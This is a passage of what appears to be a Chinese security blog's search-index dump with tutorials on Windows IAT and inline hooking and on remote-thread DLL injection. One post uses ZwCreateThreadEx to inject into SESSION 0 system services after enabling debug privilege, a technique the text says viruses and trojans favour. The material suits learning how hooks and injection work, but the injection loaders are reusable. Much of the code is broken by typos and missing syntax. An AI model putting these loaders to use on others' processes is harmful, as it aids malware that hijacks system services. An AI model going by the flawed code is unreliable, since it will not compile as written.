参考资料参考书籍《Windwos黑客编程技术详解》第4章第3节 参考Blog kn0sky lyshark","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"IAT-Hook","slug":"IAT-Hook","date":"2023-05-28T02:05:22.000Z","updated":"2023-05-29T15:34:39.071Z","comments":true,"path":"3aecea41.html","link":"","permalink":"http://example.com/3aecea41.html","excerpt":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址","text":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址 遍历64位IAT函数名和地址遍历64位IAT函数名和地址GetModuleHandle：参数只有1个，是目标模块名，此处填NULL表示当前进程，返回的是一个进程句柄，也就是当前进程的首地址区别：64位程序的基地址是Unsigned Long Long类型，用DWORD64表示运行中的程序，IAT里记录的是VA而不是RVA运行中的程序，INT里记录的是RVA而不是VA 代码示例12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main() &#123; // 获取当前程序的首地址 HMODULE hModuel = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(dwImportRVA + (DWORD64)hModule); while(pImport-&gt;Name) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); printf(&quot;%s\\n&quot;, szDllName); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;OriginalFirstThunk); if(pIAT-&gt;u1.Oridianl != 0) &#123; while(pIAT-&gt;u1.Function) PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule + pINT-&gt;AddressOfData); PDWORD64 dwFuncAddr = (PDWORD64)(pIAT-&gt;Function); printf(&quot;函数名称：%-50s&quot;, pFuncName); printf(&quot;函数地址：%p\\n&quot;, dwFuncAddr); pINT++; pIAT++; &#125; &#125; pImport++; &#125;&#125; Hook CreateFileW代码示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;Windows.h&gt;HANDLEWINAPIMyCreateFileW( _In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile)&#123; if(MessageBox(NULL, L&quot;打开文件操作被拦截&quot;, L&quot;提示&quot;, MB_YESNO) == IDYES) &#123; return CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile ); &#125; else &#123; MessageBox(NULL, L&quot;文件打开失败&quot;, L&quot;警告&quot;, NULL); return FALSE; &#125;&#125;BOOL IATHook(LPCWSTR lpModuleName, const char* szFuncName)&#123; DWORD64 dwFuncAddr = (DWROD64)GetProcAddress(GetModuleHandle(lpModuleName), szFuncName); // 获取程序基址 HMODULE hModule = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)hModule + dwImportRVA); while(pImport-&gt;Nmae) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); char szName[MAXBYTE] = &#123; 0 &#125;; strcpy_s(szName, szDllName) if(strcmp(_strlwr(szName), &quot;kernel32.dll&quot;) == 0) &#123; PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); while(pThunk-&gt;Function) &#123; if(pThunk-&gt;Function == dwFuncAddr) &#123; DWORD64 dwOldProtect; VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;Function, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;Function = (DWORD64)MyCreateFileW; break; &#125; pThunk++; &#125; break; &#125; pImport++; &#125;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: IATHook(L&quot;kernel32.dll&quot;, L&quot;CreateFileW&quot;); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"Inline Hook","slug":"Inline-Hook","date":"2023-05-21T03:22:04.000Z","updated":"2023-05-27T13:24:14.208Z","comments":true,"path":"1b00de47.html","link":"","permalink":"http://example.com/1b00de47.html","excerpt":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置","text":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置 仓库地址 5字节Inline Hook（x86）5字节Inline Hook中jcc指令长度为5根据计算公式：JMP后的偏移量 &#x3D; 目标地址 - 原地址- 5 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress; // 要Hook的函数地址BYTE m_OldBytes[5]; // 要Hook函数的头5个字节BYTE m_NewBytes[5]; // 要替换到目标函数头五个字节的新字节（jmp xxxxxxxx/ E9 xxxxxxxx）BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = (PROC)GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); m_NewBytes[0] = &#x27;\\xE9&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_FuncAddress - 5; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Hello Dokey&quot;, &quot;Hello Dokey&quot;, uType); ReHook(); return nRet;&#125;// VA Virtual Address // HMODULE hModule 模块加载基址 ImageBase 模块句柄// DWORD ul_reason_for_call 以什么原因触发的BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: // MessageBox(NULL, &quot;Dokey&quot;, &quot;Dokey&quot;, MB_OK); m_FuncAddress = NULL; memset(m_OldBytes, 0, 5); memset(m_NewBytes, 0, 5); Hook(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;, (PROC)MyMessageBoxA); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: UnHook(); break; &#125; return TRUE;&#125; 7字节Inline Hook（x86）5字节Inline Hook通过构造一个jmp指令来修改目标函数入口的字节内容，jmp指令后面的偏移量是由于CPU机器码要求jmp指令后是一个偏移量7字节Inline Hook通过修改函数入口的两条指令来完成一条是把目标地址存入寄存器eax中: mov eax, xxxxxxxx / B8 xxxxxxxx然后用jmp指令直接跳转到寄存器eax中保存的地址: jmp eax / FF E0通过指令的机器码是不变的，变化的只有地址，需要将目标函数地址保存在从第一至第四字节的位置就可以了Byte bJmpCode[] = {&#39;\\xb8&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\xff&#39;, &#39;\\xe0&#39;} 代码实现12345678910111213141516171819202122232425262728293031323334353637383940PROC m_FuncAddress;BYTE m_OldBytes[7];BYTE m_NewBytes[7];BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); m_NewBytes[0] = &#x27;\\xb8&#x27;; m_NewBytes[5] = &#x27;\\xff&#x27;; m_NewBytes[6] = &#x27;\\xe0&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); &#125; return TRUE;&#125; 12字节Inline Hook（x64）原理： mov rax, Address/jmp rax;硬编码： Byte[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0} 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress;BYTE m_OldBytes[12];BYTE m_NewBytes[12];BOOL Hook(const char* pszModulesName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); m_NewBytes[0] = &#x27;\\x48&#x27;; m_NewBytes[1] = &#x27;\\xb8&#x27;; m_NewBytes[10] = &#x27;\\xff&#x27;; m_NewBytes[11] = &#x27;\\xe0&#x27;; *(DWORD64*)(m_NewBytes + 2) = (DWORD64)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SITE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SIZTE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize);&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Dokey 12&quot;, &quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;intWINAPIMyMessageBoxW( _In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxW(hWnd, L&quot;Dokey 12&quot;, L&quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;#ifdef UNICODE#define MyMessageBox MyMessageBoxWconstexpr auto MessageBoxText = &quot;MessageBoxW&quot;;#else#define MyMessageBox MyMessageBoxAconstexpr auto MessageBoxText = &quot;MessageBoxA&quot;;#endif // !UNICODE...","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"远程线程注入","slug":"远程线程注入","date":"2023-05-17T13:46:55.000Z","updated":"2023-05-28T02:23:25.367Z","comments":true,"path":"cf459526.html","link":"","permalink":"http://example.com/cf459526.html","excerpt":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。","text":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。 CreateRemoteThread 远程线程注入OpenProcess 函数 打开现有的本地进程对象 1234567HANDLEWINAPIOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); OpenProcessdwDesiredAccess: 访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或多个进程访问权限。bInheritHandle: 此进程创建的进程是否可以继承该句柄dwProcessId: 要打开的本地进程PID如果函数成功，则返回值是打开指定进程的句柄如果函数失败，则返回值为NULL VirtualAllocEx 函数 在指定进程的虚拟地址空间内保留、提交或更改内存状态 123456789LPVOIDWINAPIVirtualAllocEx( _In_ HANDLE hProcess, _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ); VirtualAllocExhProcess: 进程句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION权限lpAddress: 指定要分配页面所需起始地址的指针。如果lpAddress为NULL，则该函数自动分配内存dwSize: 要分配内存大小，以字节为单位flAllocationType: 内存分配类型。此参数必须为以下值之一值含义MEM_COMMIT在磁盘分页和整体内存中，为指定预留内存页分配内存MEM_RESERVE保留进程中虚拟地址空间的范围，但不会在磁盘或内存上的分页文件中分配任何实际物理存储位置MEM_RESET表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入MEM_RESET_UNDO只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDOflProtect: 要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下值之一PAGE_NOACCESSPAGE_GUARDPAGE_NOCACHEPAGE_WRITECOMBINE如果函数成功，则返回值是分配页面的基址如果函数失败，则返回值为NULL WriteProcessMemory 函数 在指定进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败 123456789BOOLWINAPIWriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); WriteProcessMemoryhProcess: 要修改的进程内存句柄。句柄必须具有PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION访问权限lpBaseAddress: 指向指定进程中写入数据的基地址指针。在数据传输之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败lpBuffer: 指向缓冲区指针。其中包含要写入指定进程的地址空间中的数据nSize: 要写入指定进程的字节数lpNumberOfBytesWritten: 指向变量指针，该变量接收传输到指定进程的字节数。如果lpNumberOfBytesWritten为NULL，则忽略该参数如果函数成功，则返回值不为零如果函数失败，则返回值为零 CreateRemoteThread 函数 在另一个进程的虚拟地址空间中创建运行的线程 1234567891011HANDLEWINAPICreateRemoteThread( _In_ HANDLE hProcess, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); CreateRemoteThreadhProcess: 要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PEOCESS_VM_READ访问权限lpThreadAttributes: 指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果lpThreadAttributes为NULL，则线程将获得默认的安全描述符，并且不能继承该句柄dwStackSize: 堆栈的初始化大小，以字节为单位。如果此参数为0，则新线程使用可执行文件的默认大小lpStartAddress: 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中lpParameter: 指向要传递给线程函数的变量指针dwCreationFlags: 控制线程创建的标志，若是0，则表示线程在创建后立即执行lpThreadId: 指向接收线程标识符的变量指针。如果此参数为NULL，则不返回线程标识符如果函数成功，则返回值是新线程的句柄如果函数失败，则返回值为NULL 远程线程注入代码实现1234567891011121314151617181920212223242526272829BOOL Inject(DWORD dwPid, const WCHAR* szPath)&#123; // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 申请内存 LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_CONMIT | MEM_RESERVE, PAGE_READWRITE); if (lpAddress == 0) &#123; printf(&quot;VirtualAllocEx Failed&quot;); return FALSE; &#125; // 把动态链接库写入到目标内存中 SIZE_T szWriteLength = 0; WriteProcessMemory(hProcess, lpAddress, szPath, ((wcslen(szPath) + 1) * 2), &amp;szWrithLength); // 创建远程线程，把LoadLibrary作为回调函数，并且把刚才的地址作为参数进行调用 HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, NULL, NULL); if (hThread == 0) &#123; printf(&quot;CreateRemoteThread Failed&quot;); return FALSE; &#125; // 等待线程执行结束 WaitForSingleObject(hThread, -1); // 清理、释放空间 VirtualFreeEx(hProcess, lpAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hThread); return TRUE;&#125; ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入 与传统的CreateRemoteThread函数实现的远程线程注入DLL的唯一区别在于，突破SESSION 0远程线程注入是使用比CreateRemoteThred函数更为底层的ZwCreateThreadEx函数来创建远程线程。ZwCreateThreadEx函数可以突破SESSION 0隔离，将DLL成功注入到SESSION 0隔离的系统服务进程中。其中ZwCreateThreadEx在ntdll.dll中并没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址 函数声明64位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown) 32位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown) ZwCreateThreadEx 注入代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134BOOL ZwCreateThreadExInjectDll(DWORD dwPid, char* szDllPath)&#123; // 打开进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if(hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return FALSE; &#125; // 在目标进程申请内存 DWORD dwSize = 1 + lstrlen(szDllPath); LPVOID lpDllAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); // 将数据写入目标进程 if (FALSE == WriteProcessMemory(hProcess, lpDllAddress, szDllPath, dwSize, NULL)) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif // 获取ntdll.dll HMODULE hNtDll = LoadLibrary(&quot;ntdll.dll&quot;); if(hNtDll == NULL) &#123; printf(&quot;Load ntdll Failed\\n&quot;); return FALSE; &#125; // 获取LoadLibrary地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if(pFuncProcAddr == NULL) &#123; printf(&quot;Get LoadLibrary Failed\\n&quot;); return FALSE; &#125; // 获取ZwCreateThreadEx地址 typedef_ZwCreateThreadEx zwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtDll, &quot;ZwCreateThreadEx&quot;); HANDLE hRemoteThread = 0; DWORD dwZwCreateThreadEx = zwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, lpDllAddress, 0, 0, 0, 0, NULL); if(hRemoteThread == NULL) &#123; printf(&quot;zwCreateThreadEx Failed\\n&quot;); return FALSE; &#125; // 关闭句柄 VirtualFreeEx(hProcess, lpDllAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;// OpenProcess打开高权限的进程需要提权BOOL EnablePrivileges(HANDLE hProcess, const char* pszPrivilegesName)&#123; HANDLE hToken = NULL; LUID luidValue = &#123; 0 &#125;; TOKEN_PRIVILEGES tokenPrivileges = &#123; 0 &#125;; BOOL bRet = FALSE; DWORD dwRet = 0; // 打开进程令牌并获取进程令牌句柄 bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken); if (FALSE == bRet) &#123; printf(&quot;OpenProcessToken&quot;); return FALSE; &#125; // 获取本地系统的 pszPrivilegesName 特权的LUID值 bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &amp;luidValue); if (FALSE == bRet) &#123; printf(&quot;LookupPrivilegeValue&quot;); return FALSE; &#125; // 设置提升权限信息 tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luidValue; tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 提升进程令牌访问权限 bRet = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, 0, NULL, NULL); if (FALSE == bRet) &#123; printf(&quot;AdjustTokenPrivileges&quot;); return FALSE; &#125; else &#123; // 根据错误码判断是否特权都设置成功 dwRet = ::GetLastError(); if (ERROR_SUCCESS == dwRet) &#123; printf(&quot;SUCCESS!!\\n&quot;); return TRUE; &#125; else if (ERROR_NOT_ALL_ASSIGNED == dwRet) &#123; printf(&quot;ERROR_NOT_ALL_ASSIGNED&quot;); return FALSE; &#125; &#125; return FALSE;&#125;int main()&#123; HANDLE hProcess = GetCurrentProcess(); EnablePrivileges(hProcess, SE_DEBUG_NAME); const char* szDllPath = &quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\Dll1.dll&quot;; ZwCreateThreadExInjectDll(1364, szDllPath); system(&quot;pause&quot;); return 0;&#125; 卸载被注入的DLL文件FreeLibrary 函数12345BOOLWINAPIFreeLibrary( _In_ HMODULE hLibModule // dll 模块句柄 ); FreeLibraryFreeLibrary函数使用的模块句柄可以通过前面介绍的Module32First和Module32Next两个函数获取，需要用到MODULEENTRY32结构体 12345678910111213typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32; MODULEENTRY32hModule: 模块句柄szModule: 模块名称szExePath: 完整的模块的路径（包括路径和模块名称） 卸载DLL文件代码实现12345678910111213141516171819202122232425262728293031323334VOID UnInjectDll(DWORD dwPid, char* szDllName)&#123; if(dwPid == 0 || lstrlen(szDllName) == 0) &#123; return; &#125; // 拍摄进程快照，需要包含TlHelp32.h头文件 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SANPMODULE, dwPid) MODULEENTRY32 me32; me32.dwSize = sizeof(me32); // 查找匹配的模块名 BOOL bRet = Module32First(hSnap, &amp;me32); while (bRet) &#123; if(lstrcmp(strupr(me32.szExePath), strupr(szDllName)) == 0) &#123; break; &#125; bRet = Module32Next(hSnap, &amp;me32); &#125; CloseHandle(hSnap); // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 获取FreeLibrary函数地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;FreeLibrary&quot;); // 卸载dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, me32.hModule, 0, NULL); // WaitForSingleObject(hThread, INFINITE); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return;&#125; 无DLL的代码注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;iostream&gt;#include &lt;Windows.h&gt;constexpr auto STRLEN = 20;typedef struct _Data &#123; FARPROC dwLoadLibrary; FARPROC dwGetProcAddress; FARPROC dwGetModuleHandle; FARPROC dwGetModuleFileName; char User32Dll[STRLEN]; char MessageBox[STRLEN]; char Str[STRLEN];&#125;DATA, *PDATA;DWORD WINAPI RemoteThreadProc(LPVOID lpParam)&#123; PDATA pData = (PDATA)lpParam; // 定义API函数原型 HMODULE(__stdcall * MyLoadLibrary)(LPCTSTR); FARPROC(__stdcall * MyGetProcAddress)(HMODULE, LPCSTR); HMODULE(__stdcall * MyGetModuelHandle)(LPCTSTR); int(__stdcall * MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT); DWORD(__stdcall * MyGetModuleFileName)(HMODULE, LPTSTR, DWORD); // 对各函数地址进行赋值 MyLoadLibrary = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwLoadLibrary; MyGetProcAddress = (FARPROC(__stdcall*)(HMODULE, LPCSTR))pData-&gt;dwGetProcAddress; MyGetModuelHandle = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwGetModuleHandle; MyGetModuleFileName = (DWORD(__stdcall*)(HMODULE, LPTSTR, 